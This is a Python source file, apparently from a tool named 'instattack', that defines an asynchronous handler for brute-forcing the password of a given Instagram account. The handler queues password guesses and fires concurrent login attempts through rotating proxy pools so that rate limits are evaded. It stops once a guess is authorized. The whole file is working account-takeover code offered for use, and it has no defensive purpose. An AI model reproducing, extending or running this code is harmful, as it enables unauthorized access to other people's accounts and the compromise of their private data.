import asyncio
import aiohttp

from instattack.config import config
from instattack.lib import logger
from instattack.lib.utils import percentage, limit_as_completed, cancel_remaining_tasks

from instattack.core.exceptions import NoPasswordsError
from instattack.core.models import InstagramResults
from instattack.core.proxies import ManagedProxyPool, SmartProxyManager

from .login import AbstractLoginHandler

"""
In Regard to Cancelled Tasks on Web Server Disconnect:
---------
<https://github.com/aio-libs/aiohttp/issues/2098>

Now web-handler task is cancelled on client disconnection (normal socket closing
by peer or just connection dropping by unpluging a wire etc.)

This is pretty normal behavior but it confuses people who come from world of
synchronous WSGI web frameworks like flask or django.

>>> async def handler(request):
>>>     async with request.app['db'] as conn:
>>>          await conn.execute('UPDATE ...')

The above is problematic if there is a client disconnect.

To remedy:

(1)  For client disconnections/fighting against Task cancellation I would
     recommend asyncio.shield. That's why it exists
(2)  In case user wants a way to control tasks in a more granular way, then I
     would recommend aiojobs
(3)  Ofc if user wants to execute background tasks (inside the same loop) I
      would also recommend aiojobs
"""

__all__ = (
    'AttackHandler',
)


log = logger.get(__name__, 'Attack Handler')


class AttackHandler(AbstractLoginHandler):

    __name__ = 'Attack Handler'
    __proxy_manager__ = SmartProxyManager
    __proxy_pool__ = ManagedProxyPool

    def __init__(self, *args, **kwargs):
        super(AttackHandler, self).__init__(*args, **kwargs)

        self.passwords = asyncio.Queue()
        self.num_passwords = 0
        self.stop_event = asyncio.Event()

    async def attack(self, limit=None):
        try:
            results = await asyncio.gather(
                self._attack(limit=limit),
                self.proxy_manager.start(),
            )
        except Exception as e:
            await self.finish()
            await self.proxy_manager.stop()
            raise e
        else:
            # We might not need to stop proxy handler?
            await self.proxy_manager.stop()
            return results[0]

    async def _attack(self, limit=None):
        await self.prepopulate(limit=limit)
        results = await self.login()
        await self.finish()
        return results

    async def prepopulate(self, limit=None):
        message = f'Generating All Attempts for User {self.user.username}.'
        if limit:
            message = (
                f'Generating {limit} '
                f'Attempts for User {self.user.username}.'
            )
        log.info(message)

        passwords = await self.user.get_new_attempts(self.loop, limit=limit)
        if len(passwords) == 0:
            raise NoPasswordsError()

        self.num_passwords = len(passwords)
        for password in passwords:
            await self.passwords.put(password)

        log.info(f"Prepopulated {self.passwords.qsize()} Password Attempts")

    async def generate_attempts_for_passwords(self, session):
        """
        Generates coroutines for each password to be attempted and yields
        them in the generator.

        We don't have to worry about a stop event if the authenticated result
        is found since this will generate relatively quickly and the coroutines
        have not been run yet.
        """
        while not self.passwords.empty():
            password = await self.passwords.get()
            if password:
                yield self.attempt_login_with_password(session, password)

        log.debug('Passwords Queue is Empty')

    async def login(self):
        """
        For each password in the queue, runs the login_with_password coroutine
        concurrently in order to validate each password.

        The login_with_password coroutine will make several concurrent requests
        using different proxies, so this is the top level of a tree of nested
        concurrent IO operations.
        """
        cookies = await self.cookies()
        await self.start_event.wait()
        results = InstagramResults(results=[])

        def done_callback(fut, pending, num_tries):
            if fut.exception():
                return True

            if fut.result():
                result, num_attempts = fut.result()
                if result.conclusive:
                    self.num_completed += 1
                    results.add(result)

                    pct = percentage(self.num_completed, self.num_passwords)
                    log.info(f'{pct}', extra={
                        'other': f'Num Attempts: {num_attempts}',
                        'password': result.password,
                    })

                    if result.authorized:
                        self.stop_event.set()
                        asyncio.create_task(cancel_remaining_tasks(futures=pending))

        async with aiohttp.ClientSession(
            connector=self.connector,
            cookies=cookies,
            timeout=self.timeout,
        ) as session:
            async for fut, pending, num_tries in limit_as_completed(
                coros=self.generate_attempts_for_passwords(session),
                batch_size=config['login']['passwords']['passwords_batch_size'],
                done_callback=done_callback,
                stop_event=self.stop_event
            ):
                if fut.exception():
                    raise fut.exception()

                if fut.result():
                    result = fut.result()[0]
                    if result.conclusive:
                        await self.handle_attempt(result)

                        # Throws Asyncio.CancelledError - But we have it in the
                        # callback method.
                        # await cancel_remaining_tasks(futures=pending)

        await asyncio.sleep(0)
        return results
